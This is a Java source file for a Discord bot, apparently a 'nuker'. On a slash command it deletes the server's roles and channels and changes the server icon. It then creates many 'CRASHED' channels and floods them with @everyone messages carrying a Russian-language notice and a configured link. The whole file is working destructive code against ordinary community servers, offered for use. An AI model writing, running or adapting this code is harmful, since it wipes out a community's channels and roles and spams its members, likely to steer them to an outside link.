package ru.ceuvento;

import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.entities.channel.middleman.GuildChannel;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.managers.GuildManager;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URL;
import java.util.Comparator;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class EventHandler extends ListenerAdapter {

    @Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
        if (event.getUser().isBot()) {return;}
        String command = event.getName();

        if (command.equals("bussin")) {

            final String LINK = Main.getDotenv().get("LINK");
            final int MESSAGES_DELAY = Integer.parseInt(Main.getDotenv().get("MESSAGES_DELAY"));
            final int CHANNELS = Integer.parseInt(Main.getDotenv().get("CHANNELS"));
            final int MESSAGES_ON_EACH = Integer.parseInt(Main.getDotenv().get("MESSAGES_ON_EACH"));
            final String AVATAR_URL = Main.getDotenv().get("AVATAR_URL");

            Guild guild = event.getGuild();

            deleteRoles(guild, guild.getJDA().getSelfUser());
            try {
                setAvatar(guild, AVATAR_URL);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            removeAllChannels(guild);
            setCrashChannels(guild, CHANNELS, MESSAGES_ON_EACH, MESSAGES_DELAY, LINK);
        }
    }

    private void removeAllChannels(Guild guild) {
        List<GuildChannel> channels = guild.getChannels();
        for (GuildChannel channel : channels) {
            channel.delete().queue();
        }
    }

    private void setAvatar(Guild guild, String AVATAR_URL) throws IOException {
        BufferedImage image = ImageIO.read(new URL(AVATAR_URL));
        if(image != null) {
            ByteArrayOutputStream avatar = new ByteArrayOutputStream();
            ImageIO.write(image, "png", avatar);
            GuildManager guildManager = guild.getManager();
            guildManager.setIcon(Icon.from(avatar.toByteArray())).queue();
        }
    }

    private void deleteRoles(Guild guild, SelfUser selfUser) {
        Set<Role> delete = new HashSet<>();

        Member bot = guild.retrieveMember(selfUser).complete();
        Role botRole = bot.getRoles().stream()
                .max(Comparator
                        .comparingInt(Role::getPosition))
                .orElse(null);

        for (Role role : guild.getRoles()) {
            if (role.getPosition() < botRole.getPosition()  && !role.isManaged() && !role.isPublicRole()) {
                delete.add(role);
            }
        }

        for (Role role : delete) {
            role.delete().queue();
        }
    }

    private void setCrashChannels(Guild guild, int CHANNELS, int MESSAGES_ON_EACH, int MESSAGES_DELAY, String LINK) {
        for (int i = 1; i <= CHANNELS; i++) {
            TextChannel channel = guild.createTextChannel("🛑 CRASHED 🛑").complete();
            for (int j = 1; j <= MESSAGES_ON_EACH; j++) {
                channel.sendMessage("@everyone @here\n**# 👑 ПЕРЕЕЗД 👑\n ✅ ССЫЛКА - " + LINK + "**").queueAfter(MESSAGES_DELAY, TimeUnit.SECONDS);
            }
        }
    }

}
